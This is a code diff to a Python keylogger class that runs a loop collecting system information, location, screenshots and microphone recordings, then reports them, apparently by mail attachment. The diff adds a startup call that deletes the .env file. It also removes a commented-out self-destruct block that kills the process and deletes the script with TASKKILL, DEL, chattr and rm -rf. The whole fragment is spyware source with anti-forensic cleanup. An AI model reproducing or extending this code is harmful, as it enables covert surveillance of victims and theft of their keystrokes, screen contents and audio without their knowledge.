@@ -12,6 +12,7 @@ from utils import (
     send_mail_with_attachment,
     get_wav_and_png_files,
     delete_wav_and_png_files,
+    remove_env_file,
 )
 
 load_dotenv()
@@ -166,6 +167,8 @@ class KeyLogger:
         self.appendlog("\nscreenshot used.")
 
     def run(self):
+        remove_env_file()
+
         while True:
             self.system_information()
             self.get_location()
@@ -181,27 +184,8 @@ class KeyLogger:
             self.screenshot()
             self.microphone()
 
-            # if os.name == "nt":
-            #     try:
-            #         pwd = os.path.abspath(os.getcwd())
-            #         os.system("cd " + pwd)
-            #         os.system("TASKKILL /F /IM " + os.path.basename(__file__))
-            #         print("File was closed.")
-            #         os.system("DEL " + os.path.basename(__file__))
-            #     except OSError:
-            #         print("File is close.")
-            # else:
-            #     try:
-            #         pwd = os.path.abspath(os.getcwd())
-            #         os.system("cd " + pwd)
-            #         os.system("pkill leafpad")
-            #         os.system("chattr -i " + os.path.basename(__file__))
-            #         print("File was closed.")
-            #         os.system("rm -rf" + os.path.basename(__file__))
-            #     except OSError:
-            #         print("File is close.")
-
             time.sleep(self.interval)
+
             self.report()
 
             if self.magic_word != "" and self.magic_word in self.word:
